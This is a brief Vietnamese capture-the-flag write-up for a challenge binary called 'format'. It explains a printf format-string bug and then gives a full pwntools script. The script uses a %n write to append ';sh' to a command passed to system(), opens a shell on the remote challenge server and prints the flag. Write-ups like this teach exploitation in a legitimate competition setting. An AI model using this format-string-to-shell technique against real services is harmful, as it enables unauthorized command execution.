có bug FMT ở đây

![image](https://github.com/gookoosss/CTF/assets/128712571/347b3a53-6997-4394-b3bc-31a59bc74979)

system(cmd) nên ta xem cmd là gì

![image](https://github.com/gookoosss/CTF/assets/128712571/5cbeea0f-19ef-42e7-b783-e410cc513530)

1 lệnh echo, lợi dụng fmt ta có thể ghi đè thêm ';sh' vào cuối cmd và lấy được shell

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./format")
context.binary = exe

# p = process([exe.path])
# gdb.attach(p, gdbscript = '''
# b*main+94
# c
# ''')

# input()

p = remote('103.162.14.116', 12001)

cmd = 0x404060 + 0x55
need = 0x68733b
payload  = f'%{need}c%10$n'.encode()
# payload  += f'%{0x10000}c%11$hn'.encode()
# # payload  += f'%{need << 16 & 0xffff}c%11hn'
payload = payload.ljust(0x10)
payload += p64(cmd)
# payload += p64(0x404060 + 2)
p.sendline(payload)

# KCSC{F1rs1_Pr0b13m_w1Th_pR1Ntf}

p.interactive()
```
## Flag 
KCSC{F1rs1_Pr0b13m_w1Th_pR1Ntf}
